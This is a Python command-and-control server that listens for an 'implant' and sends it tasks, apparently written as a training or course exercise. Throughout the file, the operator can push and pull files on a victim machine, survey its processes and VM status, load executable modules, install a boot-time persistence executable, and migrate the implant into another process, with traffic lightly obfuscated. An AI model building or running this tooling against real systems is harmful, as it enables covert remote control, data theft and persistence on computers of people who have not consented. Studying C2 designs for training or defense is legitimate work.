import argparse
from re import A
import socketserver
import struct
import sys
import os
from queue import Queue
from enum import Enum

# An enumeration of message types.
# IMPORTANT: Make sure that any changes to the implant's MESSAGE_TYPE enum are replicated here,
#            or strange errors will arise!
# See PEP 435 for details on how Enums work if this is new to you:
# https://www.python.org/dev/peps/pep-0435/

MessageTypes = Enum('Type', 'Ok Err Miss RequestTasking TaskingDone PutFile GetFile Survey AddModule Persist Migrate Cleanup Test')
# duplication of the above enum as a list to help correlate user input strings to module numbers from their index
modules = ['', '', '', '', '', '', 'putfile', 'getfile', 'survey', 'addmodule', 'persist', 'migrate', 'cleanup', 'test']
persistence_file = "StartupExe.exe"
# preshared prime numbers for key generation
prime1 = 7
prime2 = 11
prime3 = 13
prime4 = 17
key_length = 4


def PrintHelp():
    '''
    This functions prints the formatted help text
    '''
    commands = ['PutFile [filename] [file contents]',
                'GetFile [filename]',
                'Survey',
                'AddModule [command]',
                '*Persist [on/off]',
                '*Migrate [pid]',
                '*Test',
                'EndTasking',
                'Exit',
                'Help',
                '*']

    descriptions = ['Put a file on the client machine with the given name and file contents',
                    'Get a file from the client machine with the given file name',
                    'Gather information about the client machine: OS details, VM detection, running processes, and current process privileges',
                    'Extends client functionality by sending a command module to be saved for future execution',
                    '(On) Send a start up executable to run at system boot for increased permanence. (Off) Removes start up executable and other permanence artifacts',
                    'Pack up needed program data, cease execution in current process and resume in specified process',
                    'Receive a message from the client to confirm functionality of AddModule command',
                    'Close connection with the client',
                    'Close connection with the client and shuts down the server',
                    'Displays this help text',
                    'Indicates that a module must be added with AddModule before it can be used']

    command_width = 40
    description_width = 50

    print(f'{"Command":<{command_width}} {"Description":<{description_width}}') #header
    print('-' * (command_width + description_width))

    #print each command
    for index, command in enumerate(commands):
        print(f'{command:<{command_width}} {descriptions[index]:<{description_width}}\n')


def recvall(sock, numbytes):
    '''
    A helper function for repeating a socket recv until numbytes are received.
    '''
    buf = bytearray()
    while len(buf) < numbytes:
        chunk = sock.recv(numbytes-len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return buf


class Message(object):
    '''
    This class represents a network message sent between Implant and Listener.
    Construct using types from the MessageTypes enum, like so:
    >>> ok = Message(MessageTypes.Ok)
    >>> long_message = Message(MessageTypes.MyType, b'my contents')
    '''
    def __init__(self, type, contents=None):
        self.type = MessageTypes(type) # convert from integer to enum here
        if contents:
            self.length = len(contents)
        else:
            self.length = 0
        self.contents = contents

    def wire_format(self):
        '''
        Returns the contents of a Message as a bytestring, ready for sending.
        Messages are:
            type: u32 | length: u32 | contents: byte[]
        '''
        header = struct.pack('<II', self.type.value, self.length)
        if self.contents:
            return header + self.contents
        return header

    @staticmethod
    def receive(sock):
        '''
        Create a Message by receiving from a socket. This will block until read.
        Function throws exceptions on partial read or invalid type.
        '''
        buf = recvall(sock, 8)
        if not buf:
            return None

        msgtype, msglen = struct.unpack("<II", buf)
        contents = None
        if msglen > 0:
            contents = recvall(sock, msglen)
            if not contents:
                return None

        return Message(msgtype, contents)


class Task(object):
    '''
    This class represents an individual Task for your implant.
    As you add functionality to the implant, write new subclasses to represent them.
    If the task can be sent in a single Message, simply override the constructor to set self.msg
    (see PutFileTask for an example)

    If the Task requires a more complicated network interaction, override the 'send' method.
    '''
    def __init__(self, msgtype):
        # override this in a subclass
        # otherwise can be used for task messages with no body
        self.msg = Message(msgtype)

    def send(self, sock):
        sock.sendall(self.msg.wire_format())


class PutFileTask(Task):
    '''
    This Task corresponds to the "PutFile" function in the implant.
    Network format:
        filename_len: u32 | filename: c_str | contents: byte[]
    '''
    def __init__(self, filename, contents):
        # This duplicates the contents of the file in memory. Not efficient, but quick to write...
        encoded_name = filename.encode('ascii') + b'\0'
        body = struct.pack('<I', len(encoded_name)) + encoded_name + contents    #<I = pack the data as little-endian unsigned int
        self.msg = Message(MessageTypes.PutFile, body)


class GetFileTask(Task):
    '''
    This Task corresponds to the "GetFile" implant function.
    '''
    def __init__(self, filename):
        encoded_name = filename.encode('ascii') + b'\0'
        self.msg = Message(MessageTypes.GetFile, encoded_name)


class AddModuleTask(Task):
    '''
    This Task corresponds to the "AddModule" implant function.
    '''
    def __init__(self, modulename):
        # Get index of value from modules array
        try:
            modulenum = modules.index(modulename.lower())
        except:
            print("|----[!] '" + modulename + "' is not a supported module. Try 'Help'")
            self.msg = None
            return

        # read file contents and length; pack message
        binpath = modulename + ".bin"
        try:
            f = open(binpath, mode='rb')
            contents = f.read()
            # print("file path: " + binpath + " file len: ", + len(contents))
            body = struct.pack('<BI', modulenum, len(contents)) + contents
            self.msg = Message(MessageTypes.AddModule, body)
        except:
            print("|----[!] No module binary found for: '" + modulename + ".bin'. Module must be located in the working directory: " + os.getcwd())
            self.msg = None

class PersistTask(Task):
    '''
    This Task corresponds to the "Migrate" implant function.
    '''
    def __init__(self, mode):
        mode = mode.lower()
        if mode == "on":
            try:
                f = open(persistence_file, mode='rb')
                contents = f.read()
                body = struct.pack('<BI', 1, len(contents)) + contents
                self.msg = Message(MessageTypes.Persist, body)
            except:
                print("|----[!] No executable found named: '" + persistence_file + "'. It must be located in the same directory as CNCServer")
                self.msg = None
        elif mode == "off":
            self.msg = Message(MessageTypes.Persist, struct.pack('<B', 0))
        else:
            print("|----[!] Unsupported mode selected for persistence. Try 'Help'")
            self.msg = None

class MigrateTask(Task):
    '''
    This Task corresponds to the "Migrate" implant function.
    '''
    def __init__(self, pid):
        if pid.isdigit():
            self.msg = Message(MessageTypes.Migrate, struct.pack('<I', int(pid)))
        else:
            print("|----[!] Migration target must be a PID number (Process ID). Try 'Survey'")
            self.msg = None


class TaskingRequestHandler(socketserver.BaseRequestHandler):
    '''
    This class implements the request handling logic for a python socketserver.
    A new instance of TaskingRequestHandler is created for each connection from the client.
    '''
    def __init__(self, request, client_address, server):
        self.taskQueue = Queue()
        self.keyshifts = [0] * 4
        super().__init__(request, client_address, server)

    def serve_tasking(self):
        exit = False;
        while True:
            command = input("C2Server@Client >>> ")
            # if interpreted command is an exiting command
            if interpret_command(command, self) == False:
                exit = True

            # if tasks are in the queue
            if not self.taskQueue.empty():
                task = self.taskQueue.get()

                # break out if TaskingDone, signifies end of comms
                if task.msg.type == MessageTypes.TaskingDone:
                    break

                # send task as a serialized packet
                print("|----[+] Sending task...")
                if task.msg.contents:
                    task.msg.contents = self.encrypt_data(task.msg.contents)
                task.send(self.request)
                print("|----[+] Task sent! Waiting for response...")

                # wait for a response
                response = Message.receive(self.request)
                print("|----[+] Response received!")

                # handle response types
                if response == None:
                    print("|----[!] Client connection closed abruptly")
                    break
                elif response.type == MessageTypes.Err:
                    print("|----[!] Client reported error")
                    break
                elif response.type == MessageTypes.Miss:
                    print("|----[!] Client reported missing module. Try 'AddModule'")
                elif response.type == MessageTypes.Ok:
                    if response.contents:
                        response.contents = self.decrypt_data(response.contents)
                        print("|----[+] Response Data:", response.contents.decode("ascii"))
                    print("|----[+] Task completed")
                    # break out on successful Migrate, comms will reconnect with migrated Implant
                    if task.msg.type == MessageTypes.Migrate:
                        break
                else:
                    print("|----[!] Client responded with an unknown message type")


        # on break, tell implant we are done
        done = Message(MessageTypes.TaskingDone)
        try:
            self.request.sendall(done.wire_format())
        except ConnectionResetError:
            print("|----[!] Connection was closed by implant before sending 'EndTasking' message")

        # if exit flag was set (exit command) then shutdown server
        if exit:
            self.server.shutdown()


    def handle(self):
        print("[+] Client connected from (%s, %d)" % self.client_address)
        msg = Message.receive(self.request)
        if (msg.type == MessageTypes.RequestTasking) and (self.parse_key(msg)):
            self.serve_tasking()            #await tasking
        else:
            print("[!] Client sent unrecognized request")


    def parse_key(self, msg):
        if not msg.contents:
            print("[!] Client did not supply a key base for encryption")
            return False
        keysum = struct.unpack('<I', msg.contents)[0]
        # print("Key sum: ", keysum)
        self.keyshifts[0] = keysum % prime1
        self.keyshifts[1] = keysum % prime2
        self.keyshifts[2] = keysum % prime3
        self.keyshifts[3] = keysum % prime4
        # print("shifts: ", self.keyshifts[0], " ", self.keyshifts[1], " ", self.keyshifts[2], " ", self.keyshifts[3])
        return True


    def decrypt_data(self, contents):
        data = bytearray(contents)
        for idx in range(0, len(data)):
            data[idx] = (data[idx] - self.keyshifts[idx % key_length]) & 0xFF
        return data

    def encrypt_data(self, contents):
        data = bytearray(contents)
        for idx in range(0, len(data)):
            data[idx] = (data[idx] + self.keyshifts[idx % key_length]) & 0xFF
        return data



def interpret_command(command:str, client:TaskingRequestHandler) -> bool:
    '''
    This function handles parsing commands and executing the command by either calling another function or enqueuing tasks
    into the client's task queue.
    Returns a bool, whether or not server should continue accepting commands
    following this command.
    '''
    if command == '' or command == " ":
        return True
    command, *command_input = command.split()

    command = command.lower()

    if command == 'help':
        PrintHelp()

    elif command == 'endtasking':
        client.taskQueue.put(Task(MessageTypes.TaskingDone))

    elif command == 'exit':
        client.taskQueue.put(Task(MessageTypes.TaskingDone))
        return False

    elif command == 'putfile':
        if len(command_input) < 2:
            print("Not enough arguments for the command")
        else:
            putfile_task = PutFileTask(command_input[0], " ".join(command_input[1:]).encode('ascii'))
            client.taskQueue.put(putfile_task)

    elif command == 'getfile':
        if len(command_input) < 1:
            print("Not enough arguments for the command")
        else:
            client.taskQueue.put(GetFileTask(command_input[0]))

    elif command == 'survey':
        client.taskQueue.put(Task(MessageTypes.Survey))

    elif command == 'addmodule':
        if len(command_input) < 1:
            print("Not enough arguments for the command")
        else:
            addmodtask = AddModuleTask(command_input[0])
            if addmodtask.msg:
                client.taskQueue.put(addmodtask)

    elif command == 'persist':
        if len(command_input) < 1:
            print("Not enough arguments for the command")
        else:
            persisttask = PersistTask(command_input[0])
            if persisttask.msg:
                client.taskQueue.put(persisttask)

    elif command == 'migrate':
        if len(command_input) < 1:
            print("Not enough arguments for the command")
        else:
            migratetask = MigrateTask(command_input[0])
            if migratetask.msg:
                client.taskQueue.put(migratetask)

    elif command == 'test':
        client.taskQueue.put(Task(MessageTypes.Test))

    else:
        print("Unrecognized command.")

    return True


def cleanup(server:socketserver.TCPServer):
    '''
    Clean up and exit application by shutting down the server and exiting with code 0 on success, or exit with code 1 on failure.
    Feel free to modify this as your code progresses
    '''
    try:
        print("[.] Shutting Down...")
        server.server_close()
        sys.exit(0)
    except:
        sys.exit(1)


def main(host, port):
    print("[+] Initializing C2-Server...")

    #Initialize server
    try:
        server = socketserver.ThreadingTCPServer((host, int(port)), TaskingRequestHandler)
    except:
        print("[-] Failed to initialize server. Make sure you gave a valid IP and Port number")
        return

    print("[+] C2-Server Initialized!")
    print("[+] Type 'help' for more options")

    # loop forever, serving one client at a time.
    # (If multiple clients are required, see socketserver documentation)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass

    cleanup(server)


def getArgParser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument("server_ip", nargs='?', default='', help="Hostname or IP to listen on.")               # TODO: default to any?
    parser.add_argument("server_port", type=int, nargs='?', default=31337, help="Port number to listen on.")      # TODO: default port
    return parser


if __name__ == "__main__":
    opts = getArgParser().parse_args()

    main(opts.server_ip, opts.server_port)
